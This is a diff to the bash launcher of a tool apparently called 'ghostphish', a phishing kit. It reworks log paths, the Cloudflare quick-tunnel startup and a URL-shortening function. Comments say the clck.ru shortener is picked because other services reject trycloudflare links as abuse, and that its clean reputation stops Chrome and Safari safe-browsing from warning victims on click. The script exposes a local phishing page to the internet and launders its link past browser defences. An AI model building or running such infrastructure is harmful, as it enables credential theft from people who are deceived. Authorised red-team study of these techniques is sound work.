@@ -31,12 +31,12 @@ link() {
 PORT=8000
 VERSION="1.0.0"
 SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
-# Portable temp path — Termux's $TMPDIR is $PREFIX/tmp, Linux is /tmp
-TMP="${TMPDIR:-/tmp}"
-LOG_FILE="$TMP/ghostphish_tunnel.log"
-PID_FILE="$TMP/ghostphish_tunnel.pid"
-UVICORN_LOG="$TMP/ghostphish_uvicorn.log"
-UVICORN_PID="$TMP/ghostphish_uvicorn.pid"
+# Write logs to repo dir, not /tmp (which can be sandbox-blocked or have perms issues).
+# Keep manual-mode logs separate from persistent-supervisor logs.
+LOG_FILE="$SCRIPT_DIR/ghostphish_start_manual.log"
+PID_FILE="$SCRIPT_DIR/ghostphish_start_manual.pid"
+UVICORN_LOG="$SCRIPT_DIR/ghostphish_uvicorn_manual.log"
+UVICORN_PID="$SCRIPT_DIR/ghostphish_uvicorn_manual.pid"
 WIDTH=64
 
 # ─── Templates: slug|Name|description ─────────────
@@ -200,13 +200,16 @@ start_container() {
 # ─── Cloudflared tunnel ───────────────────────────
 start_tunnel() {
     if ! command -v cloudflared >/dev/null 2>&1; then
-        msg_warn "cloudflared missing · falling back to localhost"
+        msg_warn "cloudflared not installed · use persistent supervisor instead"
+        msg_warn "  install: wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared"
+        msg_warn "  or use: ./tunnel-persistent.sh (recommended for real engagements)"
         TUNNEL_URL="http://localhost:${PORT}"
         return 1
     fi
 
     msg_info "deploying cloudflare quick-tunnel..."
-    pkill -f "cloudflared tunnel" 2>/dev/null
+    # Kill ONLY our tunnel process (if it exists), not all cloudflared instances
+    [[ -f "$PID_FILE" ]] && kill $(cat "$PID_FILE") 2>/dev/null
     sleep 1
     : > "$LOG_FILE"
 
@@ -217,27 +220,39 @@ start_tunnel() {
     # Braille spinner
     local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
     TUNNEL_URL=""
-    for i in {1..30}; do
+    for i in {1..40}; do
         TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
         [[ -n "$TUNNEL_URL" ]] && { printf "\r  ${G}[+]${N} tunnel handshake ok                          \n"; break; }
+        # Check if process died before URL appeared
+        if ! kill -0 $TUNNEL_PID 2>/dev/null; then
+            printf "\r%*s\r" $WIDTH " "
+            msg_err "cloudflared crashed before URL"
+            tail -20 "$LOG_FILE" | sed 's/^/    /'
+            TUNNEL_URL="http://localhost:${PORT}"
+            return 1
+        fi
         printf "\r  ${Y}${frames[$((i % 10))]}${N}  waiting for cloudflare edge... (${i}s)"
         sleep 1
     done
 
     if [[ -z "$TUNNEL_URL" ]]; then
         printf "\r%*s\r" $WIDTH " "
-        msg_err "tunnel timeout · see ${LOG_FILE}"
+        msg_err "tunnel timeout (>40s) · cloudflare service may be down"
+        msg_err "  check: tail -f ${LOG_FILE}"
         TUNNEL_URL="http://localhost:${PORT}"
         return 1
     fi
 
     # Warm-up wait — edge takes ~5-15s to be reachable
     msg_info "warming edge..."
-    for i in {1..15}; do
-        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${TUNNEL_URL}/health")
+    for i in {1..20}; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TUNNEL_URL}/health" 2>/dev/null)
         [ "$code" = "200" ] && break
         sleep 1
     done
+    if [ "$code" != "200" ]; then
+        msg_warn "edge not responding after 20s (HTTP $code) · may take longer"
+    fi
     msg_ok "tunnel live ${D}→${N} ${C}${TUNNEL_URL}${N}"
     return 0
 }
@@ -381,33 +396,37 @@ register_alias() {
 # is.gd and tinyurl explicitly reject trycloudflare URLs as 'abuse'.
 # The short link (clck.ru/xxxx) has clean reputation, so Chrome / Safari
 # safe-browsing don't warn on click. Redirect chain: clck.ru → yandex → target.
+# All services are optional — if they're down or reject the URL, we silently
+# fall back to the full URL. The link still works.
 shorten_url() {
     local url="$1"
     local encoded short
 
-    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$url" 2>/dev/null)
+    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$url" 2>/dev/null) || encoded="$url"
 
     # clck.ru — Russian shortener, accepts trycloudflare.com URLs
     short=$(curl -sfL --max-time 8 -G --data-urlencode "url=${url}" "https://clck.ru/--" 2>/dev/null)
-    if [[ "$short" =~ ^https?://clck\.ru/ ]]; then
+    if [[ -n "$short" ]] && [[ "$short" =~ ^https?://clck\.ru/ ]]; then
         echo "$short"
         return 0
     fi
 
     # tinyurl fallback — likely blocks trycloudflare, but works for other hosts
     short=$(curl -sfL --max-time 8 "https://tinyurl.com/api-create.php?url=${encoded}" 2>/dev/null)
-    if [[ "$short" =~ ^https?://tinyurl\.com/ ]]; then
+    if [[ -n "$short" ]] && [[ "$short" =~ ^https?://tinyurl\.com/ ]]; then
         echo "$short"
         return 0
     fi
 
     # is.gd last-resort — same story
     short=$(curl -sfL --max-time 8 "https://is.gd/create.php?format=simple&url=${encoded}" 2>/dev/null)
-    if [[ "$short" =~ ^https?://is\.gd/ ]]; then
+    if [[ -n "$short" ]] && [[ "$short" =~ ^https?://is\.gd/ ]]; then
         echo "$short"
         return 0
     fi
 
+    # All shorteners failed or were unavailable. Log it for visibility but don't fail the engagement.
+    echo "" >&2
     return 1
 }
 
